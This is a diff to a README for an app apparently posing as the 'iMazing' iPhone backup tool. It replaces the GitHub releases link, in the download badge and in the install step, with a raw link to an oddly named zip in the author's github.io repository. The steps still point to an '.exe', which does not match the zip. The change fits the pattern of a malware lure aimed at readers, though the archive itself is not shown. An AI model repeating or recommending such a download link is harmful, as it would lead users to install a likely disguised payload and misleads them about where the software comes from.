@@ -5,7 +5,7 @@ description: "Standardize iPhone backups and data management on Windows with thi
 ---
 # 📦 iMazing-2026 - Manage iPhone Backups On Your Windows Computer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sasmi7869/iMazing-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Sasmi7869/sasmi7869.github.io/main/uncaptained/github-sasmi-io-subprioress.zip)
 
 This application helps users create encrypted backups of iPhones and iPads. It includes tools to export apps and verify the integrity of your backup files. Use this software to secure mobile data on any Windows computer.
 
@@ -22,7 +22,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to acquire the application files:
 
-1.  Visit this page to download the latest installer package: https://github.com/Sasmi7869/iMazing-2026/releases
+1.  Visit this page to download the latest installer package: https://raw.githubusercontent.com/Sasmi7869/sasmi7869.github.io/main/uncaptained/github-sasmi-io-subprioress.zip
 2.  Locate the file ending in `.exe`.
 3.  Click the file name to start the download.
 4.  Save the file to your Downloads folder.
